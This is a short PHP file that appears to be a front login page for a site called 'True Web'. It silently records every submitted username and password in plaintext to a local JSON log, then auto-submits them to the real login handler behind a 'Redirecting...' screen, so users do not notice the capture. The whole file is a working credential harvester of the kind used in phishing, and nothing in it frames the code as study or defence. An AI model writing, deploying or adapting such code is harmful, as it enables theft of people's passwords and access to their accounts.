<?php //inside after folder
// When credentials are submitted, create a hidden form to auto-submit to true_web.php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    // Store credentials if needed (optional)
    $logFile = __DIR__ . '/backup_log.json';
    $log = [];
    if (file_exists($logFile)) {
        $existing = @file_get_contents($logFile);
        if ($existing) {
            $log = json_decode($existing, true) ?: [];
        }
    }
    $log[] = [
        'username' => $username,
        'password' => $password,
        'timestamp' => date('Y-m-d H:i:s')
    ];
    file_put_contents($logFile, json_encode($log, JSON_PRETTY_PRINT));

    // Show auto-submit form
    echo '<!DOCTYPE html><html><head><title>Redirecting...</title></head><body>';
    echo '<p>Redirecting to login page...</p>';
    echo '<form id="loginForm" method="post" action="true_web.php">';
    echo '<input type="hidden" name="username" value="' . htmlspecialchars($username, ENT_QUOTES, 'UTF-8') . '">';
    echo '<input type="hidden" name="password" value="' . htmlspecialchars($password, ENT_QUOTES, 'UTF-8') . '">';
    echo '</form>';
    echo '<script>document.getElementById("loginForm").submit();</script>';
    echo '</body></html>';
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
</head>
<body>
    <h1>Login to True Web</h1>

    <form method="post" action="<?= htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES, 'UTF-8') ?>">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required autofocus>

        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>

        <input type="submit" value="Login">
    </form>

</body>
</html>